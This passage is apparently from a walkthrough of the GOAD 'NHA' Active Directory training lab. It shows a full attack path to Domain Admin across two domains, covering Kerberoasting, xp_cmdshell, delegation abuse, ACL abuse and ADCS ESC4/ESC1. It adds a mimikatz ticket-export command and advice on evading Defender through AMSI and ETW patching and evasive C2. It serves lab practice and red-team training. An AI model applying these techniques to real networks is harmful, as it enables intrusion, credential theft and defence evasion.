6. **TGT harvest instead of cleartext** — during the CredSSP bot window, dump frank's TGT with `sekurlsa::tickets /export`. You get Kerberos auth without ever seeing the password, and you sidestep any cleartext-specific EDR rules.

7. **Cross-realm TGS request** — from ACADEMY DA, skip the trust-key dump entirely and request a cross-realm TGS for a NINJA service directly. Simpler than forging, and the referral chain is less scrutinized.

8. **Anonymous LDAP / SMB enum before any web exploitation** — NHA's DCs may permit some anonymous LDAP queries; checking first is free and can leak user lists for AS-REP and Kerberoasting. See [AD Enumeration](/active-directory/ad-enumeration/).

---

## Full Attack Path Summary

```
[EXTERNAL]
    │
    ▼
[1] Web exploit → RCE on web (SRV01 / 192.168.58.21)
    │
    ▼
[2] CredSSP bot captures frank's cleartext creds (srv03 → srv01 every 60s)
    │  ── OR ──
    Kerberoast frank (SPN: HTTP/WEB.academy.ninja.lan) → crack
    │
    ▼
[3] frank → MSSQL sysadmin on sql (SRV02) → xp_cmdshell → code exec
    │  ── AND ──
    frank → constrained delegation (S4U2Self) → impersonate DA on share (SRV03)
    │
    ▼
[4] SRV03 (share): read gmsaNFS$ password → ForceChangePassword on backup
    │
    ▼
[5] backup → WriteOwner on Sensei group → add to DA group → Domain Admin (ACADEMY)
    │  ── AND ──
    SQL$ → GenericAll on Computers OU → RBCD abuse → lateral movement in ACADEMY
    │
    ▼
[6] Trust pivot: academy.ninja.lan → ninja.hack
    │
    ▼
[7] olivia.davis WriteDacl → rachel.philips → Sanin → GenericAll → Jonin → GenericAll
    → SignatureValidation ADCS template → ESC4 → ESC1 → DA cert → Domain Admin (NINJA)
```

## Evasion Considerations

All machines run Windows Defender. Standard unobfuscated Meterpreter, Empire, or Covenant payloads will be detected immediately. Before attacking:

**Payload & C2:**
- Use an evasive C2 (Havoc, Sliver, Cobalt Strike) with custom loaders — see [Shellcode Loaders](/evasion/shellcode-loaders/)
- Encrypt payload in transit and on disk — see [Payload Encryption](/evasion/payload-encryption/)
- Consider [PE Obfuscation](/evasion/pe-obfuscation/) and [Binary Padding](/evasion/binary-padding/) for staged implants

**In-process bypasses (before .NET / PowerShell tooling):**
- Patch AMSI in-process before Rubeus, SharpHound, etc. — see [AMSI Bypass](/evasion/amsi-bypass/)
- Patch ETW to blind script-block logging — see [ETW Bypass](/evasion/etw-bypass/)
- Unhook NTDLL if EDR hooks are in play — see [DLL Unhooking](/evasion/dll-unhooking/)
- Use [Indirect Syscalls](/evasion/indirect-syscalls/) for LSASS access instead of WinAPI

**Attacker-side preference:**
- Prefer LOLBAS and proxy execution where possible — see [LOTL Advanced](/evasion/lotl-advanced/) and [LOLBAS Reference](/evasion/lolbas-reference/)
- Run BloodHound collection from Linux (bloodhound-python) to avoid dropping SharpHound.exe
- Run Impacket (`getST.py`, `GetUserSPNs.py`, `addcomputer.py`) and bloodyAD from Linux — zero on-host artifacts
- Run certipy from Linux for every ADCS operation

**Per-stage evasion is inline with each stage above.** See [Windows Defender](/evasion/windows-defender/) for the full evasion reference page and [AV/EDR Evasion](/evasion/av-edr-evasion/) for broader defense bypass guidance.

## Key Resources

- [GOAD repository (includes NHA provisioning)](https://github.com/Orange-Cyberdefense/GOAD)
- [NHA lab documentation](https://orange-cyberdefense.github.io/GOAD/labs/NHA/)
- [Lab author's blog with GOAD/NHA walkthroughs](https://mayfly277.github.io)
- [Certipy for ADCS attack enumeration and exploitation](https://github.com/ly4k/Certipy)
- [bloodyAD for ACL manipulation from Linux](https://github.com/CravateRouge/bloodyAD)
